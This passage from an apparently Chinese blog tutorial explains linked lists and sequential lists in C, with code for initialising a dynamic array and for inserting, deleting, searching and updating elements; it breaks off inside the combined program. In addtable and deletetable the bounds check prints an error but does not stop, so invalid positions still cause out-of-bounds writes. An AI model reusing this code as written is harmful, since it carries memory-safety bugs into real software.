alt=\"image-20220913010445304\"></p>\n<p>这里的data数据类型并未做限制，多个链接起来</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913010557172.png\" alt=\"image-20220913010557172\"></p>\n<p>构成了链表，用链表实现插入操作</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913010635675.png\" alt=\"image-20220913010635675\"></p>\n<p>可以看到，我们只需要更改指针指向即可</p>\n<p>链表有单链表，双链表和循环单链表</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913010758871.png\" alt=\"image-20220913010758871\"></p>\n<h2 id=\"顺序储存结构\"><a href=\"#顺序储存结构\" class=\"headerlink\" title=\"顺序储存结构\"></a>顺序储存结构</h2><p>顺序表，全名顺序储存结构，顺序表存储数据时，会提前申请一整块足够大小的物理空间，然后将数据依次存储起来，存储时做到数据元素之间不留一丝缝隙。</p>\n<h3 id=\"1、顺序表的初始化\"><a href=\"#1、顺序表的初始化\" class=\"headerlink\" title=\"1、顺序表的初始化\"></a>1、顺序表的初始化</h3><p>使用顺序表除了要提前申请到足够大小的物理空间以外，为了方便后期数据的使用，还需要记录两项数据</p>\n<ol>\n<li>顺序表申请的存储容量</li>\n<li>顺序表的长度，也就是表中存储数据元素的个数</li>\n</ol>\n<p>注意：正常情况下顺序表的储存容量要大于顺序表的长度</p>\n<p>因此我们自定义顺序表</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Table</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>head<span class=\"token punctuation\">;</span><span class=\"token comment\">//声明了一个名为head的长度不确定的数组，也叫“动态数组”</span>\n    <span class=\"token keyword\">int</span> length<span class=\"token punctuation\">;</span><span class=\"token comment\">//记录当前顺序表的长度</span>\n    <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span><span class=\"token comment\">//记录顺序表分配的存储容量</span>\n<span class=\"token punctuation\">&#125;</span>table<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里head 是我们声明的一个未初始化的动态数组，不要只把它看做是普通的指针。</p>\n<p>初始化需要做两件事</p>\n<ol>\n<li>给head动态数据申请到足够大小的空间</li>\n<li>给size和length赋值</li>\n</ol>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">Size</span> <span class=\"token expression\"><span class=\"token number\">5</span> </span><span class=\"token comment\">//对Size进行宏定义，表示顺序表申请空间的大小</span></span>\ntable <span class=\"token function\">initTable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    table t<span class=\"token punctuation\">;</span>\n    t<span class=\"token punctuation\">.</span>head<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>Size<span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//构造一个空的顺序表，动态申请存储空间</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">)</span> <span class=\"token comment\">//如果申请失败，作出提示并直接退出程序</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"初始化失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//空表的长度初始化为0</span>\n    t<span class=\"token punctuation\">.</span>size<span class=\"token operator\">=</span>Size<span class=\"token punctuation\">;</span><span class=\"token comment\">//空表的初始存储空间为Size</span>\n    <span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>完整的代码</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">Size</span> <span class=\"token expression\"><span class=\"token number\">5</span></span></span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Table</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>head<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> length<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>table<span class=\"token punctuation\">;</span>\n\ntable <span class=\"token function\">initTable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//初始化函数</span>\n\ttable t<span class=\"token punctuation\">;</span>\n\tt<span class=\"token punctuation\">.</span>head<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>Size<span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tt<span class=\"token punctuation\">.</span>length<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\tt<span class=\"token punctuation\">.</span>size<span class=\"token operator\">=</span>Size<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">dispaly</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">)</span><span class=\"token comment\">//输出函数</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\ttable t<span class=\"token operator\">=</span><span class=\"token function\">initTable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;=</span>Size<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>i<span class=\"token punctuation\">;</span>\n        t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">dispaly</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913233539593.png\" alt=\"image-20220913233539593\"></p>\n<h3 id=\"2、顺序表的基本操作\"><a href=\"#2、顺序表的基本操作\" class=\"headerlink\" title=\"2、顺序表的基本操作\"></a>2、顺序表的基本操作</h3><h4 id=\"1、顺序插入元素\"><a href=\"#1、顺序插入元素\" class=\"headerlink\" title=\"1、顺序插入元素\"></a>1、顺序插入元素</h4><p>向现有的表中插入数据，分下面三种情况</p>\n<ol>\n<li>插入到顺序表的表头</li>\n<li>在表中间插入</li>\n<li>在表的末尾插入</li>\n</ol>\n<p>插入的方式，先找到插入的位置，将位置后面的元素整体后移一个位置，然后将插入数据放到这个位置上</p>\n<p>c语言中代码实现</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">table <span class=\"token function\">addtable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> data<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//插入函数，data为插入元素，add为插入位置 </span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>add<span class=\"token operator\">></span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">||</span>add<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"插入位置不合法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span> \n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">>=</span>t<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//判断顺序表是否已满</span>\n\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">realloc</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>size<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//realloc函数重新分配内存空间</span>\n\t\tt<span class=\"token punctuation\">.</span>size<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">>=</span>add<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//将插入位置后的元素后移</span>\n\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>add<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>data<span class=\"token punctuation\">;</span><span class=\"token comment\">//插入元素</span>\n\tt<span class=\"token punctuation\">.</span>length<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//顺序表长度加1</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"2、顺序表删除元素\"><a href=\"#2、顺序表删除元素\" class=\"headerlink\" title=\"2、顺序表删除元素\"></a>2、顺序表删除元素</h4><p>和插入相对应，找到这个元素后将这个位置后面的元素整体向前位移一位</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">table <span class=\"token function\">deletetable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//删除函数，add为删除位置 </span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>add<span class=\"token operator\">></span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">||</span>add<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除位置不合法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>add<span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//将删除位置后的元素前移</span>\n\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tt<span class=\"token punctuation\">.</span>length<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//顺序表长度减1</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"3、顺序表查找元素\"><a href=\"#3、顺序表查找元素\" class=\"headerlink\" title=\"3、顺序表查找元素\"></a>3、顺序表查找元素</h4><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">table <span class=\"token function\">selecttable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//查找函数，data为查找元素 </span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查找成功，该元素位置为%d\"</span><span class=\"token punctuation\">,</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查找失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"4、顺序表更改元素\"><a href=\"#4、顺序表更改元素\" class=\"headerlink\" title=\"4、顺序表更改元素\"></a>4、顺序表更改元素</h4><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">table <span class=\"token function\">updatetable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> data<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> newdata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//修改函数，data为修改元素，newdata为修改后的元素 </span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>newdata<span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"修改成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"修改失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"总\"><a href=\"#总\" class=\"headerlink\" title=\"总\"></a>总</h4><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">Size</span> <span class=\"token expression\"><span class=\"token number\">5</span></span><span class=\"token comment\">//对Size进行宏定义，表示顺序表申请空间的大小</span></span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Table</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>head<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> length<span class=\"token punctuation\">;</span><span class=\"token comment\">//记录当前顺序表的长度</span>\n\t<span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span><span class=\"token comment\">//记录顺序表分配的存储容量</span>\n<span class=\"token punctuation\">&#125;</span>table<span class=\"token punctuation\">;</span>\n\ntable <span class=\"token function\">initTable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//初始化函数 </span>\n\ttable t<span class=\"token punctuation\">;</span>\n\tt<span class=\"token punctuation\">.</span>head<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>Size<span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//构造一个空的顺序表，动态申请存储空间</span>\n\tt<span class=\"token punctuation\">.</span>length<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\tt<span class=\"token punctuation\">.</span>size<span class=\"token operator\">=</span>Size<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">dispaly</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">)</span><span class=\"token comment\">//输出函数 </span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ntable <span class=\"token function\">addtable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> data<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//插入函数，data为插入元素，add为插入位置 </span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>add<span class=\"token operator\">></span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">||</span>add<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"插入位置不合法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span> \n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">>=</span>t<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//判断顺序表是否已满</span>\n\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">realloc</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>size<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//realloc函数重新分配内存空间</span>\n\t\tt<span class=\"token punctuation\">.</span>size<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">>=</span>add<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//将插入位置后的元素后移</span>\n\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>add<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>data<span class=\"token punctuation\">;</span><span class=\"token comment\">//插入元素</span>\n\tt<span class=\"token punctuation\">.</span>length<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//顺序表长度加1</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> \n\ntable <span class=\"token function\">deletetable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//删除函数，add为删除位置 </span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>add<span class=\"token operator\">></span>t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">||</span>add<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token 